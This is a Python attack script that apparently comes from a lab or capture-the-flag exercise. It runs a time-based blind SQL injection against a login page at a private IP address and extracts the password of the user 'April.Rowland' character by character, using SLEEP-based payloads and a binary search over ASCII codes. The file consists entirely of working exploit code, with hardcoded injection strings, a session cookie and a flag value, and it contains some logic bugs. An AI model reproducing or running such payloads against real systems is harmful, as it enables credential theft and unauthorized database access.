import requests
import re
import time

start_time = time.time()
session = requests.Session()
url = "http://192.168.22.100/Login" #input("Enter the url: ")
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
numList = list(range(0,254)) #Generates a list from 0 to 254 which will symbolize ASCII character codes to extract information from database
name = []
i = 0

headers = {'Host': '192.168.22.100',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'multipart/form-data; boundary=---------------------------343376800035355685862873661517',
		'Origin': 'http://192.168.22.100',
		'Connection': 'close',
		'Referer': 'http://192.168.22.100/Login',
		'Cookie':'FLAG=c2VjcmV0cy1hcmUtbWVhbnQtdG8tYmUtdG9sZA==;JSESSIONID=8A728A3A7991FA3CEA96EF45B54D89BB',
		'Upgrade-Insecure-Requests': '1'}

def localvar(): #Assings a local variable - Defines which position in the name we are trying to extract i.e. first letter, second letter etc.
    pos1 = 0
    return pos1

def chngLetter(pos1): # This function will change the position of our payload to point to the next character in the dataset
    pos1 = pos1 + 1
    sendPayload(pos1) # Takes the new position and passes it to sendPayload
    

def sendPayload(pos2):
    low = 0 # Low position in array
    high = len(numList) - 1 # high position in array

    
    while low <=high:
        middle = (high + low) // 2 #Go to middle of array


        # Checking if the middle of the array matches the first character
        payload = "test'+OR+1%3d1+AND(+SELECT+ASCII(SUBSTR(password,"+str(pos2)+",1))+FROM+Users+WHERE+Username_field%3d'April.Rowland')%3d"+str(numList[middle])+"-SLEEP(5)+%%3b%23"
        r = session.post(url, headers=headers, data=payload, proxies=proxies)
        
        if r.ok:
            if (r.elapsed.total_seconds()) > 4: # If server sleeps for 5 seconds we know the statement is true
                name.append(chr(numList[middle]))
                print("[+] Successfully found character")
                print("[+] Character is ".join(name[i]))
                i = i + 1
                chngLetter(pos2)
                
            else:
                #print("[-] Unsuccessfull, trying again... \n")
                var1 = 0
            
        else:
            print("[-]Error Sending Payload!")
            print(r.text)



        if (var1==0):
            # If not middle, checks to see if value is less than middle
            payload = "test'+OR+1%3d1+AND(+SELECT+ASCII(SUBSTR(password,"+str(pos2)+",1))+FROM+Users+WHERE+Username_field%3d'April.Rowland')%3c"+str(numList[middle])+"-SLEEP(5)+%%3b%23"
            r = session.post(url, headers=headers, data=payload, proxies=proxies)

            if r.ok:
                if (r.elapsed.total_seconds()) > 4:
                    high = middle - 1 # Looks in bottom half of array
                    var2 = 1
                    
                else:
                    var2 = 0
                    
            else:
                print("Error Sending Payload!")
                print(r.text)
        


        if(var2==0): 
            # If not any of above, checks if value is more than middle
            payload = "test'+OR+1%3d1+AND(+SELECT+ASCII(SUBSTR(password,"+str(pos2)+",1))+FROM+Users+WHERE+Username_field%3d'April.Rowland')%3e"+str(numList[middle])+"-SLEEP(5)+%%3b%23"
            r = session.post(url, headers=headers, data=payload, proxies=proxies)

            if r.ok:
                if (r.elapsed.total_seconds()) > 4:
                    low = middle + 1 # Looks in bottom half of array
                    
                else:
                    print("Cant find next Letter. ")
                    print(name)
                    

            else:
                print("[-]Error Sending Payload!")
                print(r.text)





def main():
    pos1 = localvar()               # Assigns the value returned from localvar function to the variable pos1
    pos2 = chngLetter(pos1)         # Assigns the value returned from chngLetter function to the variable pos2, passing it pos1 from earlier
    print("%s seconds" % (time.time() - start_time)) # Performance check

if __name__=="__main__":
    main()
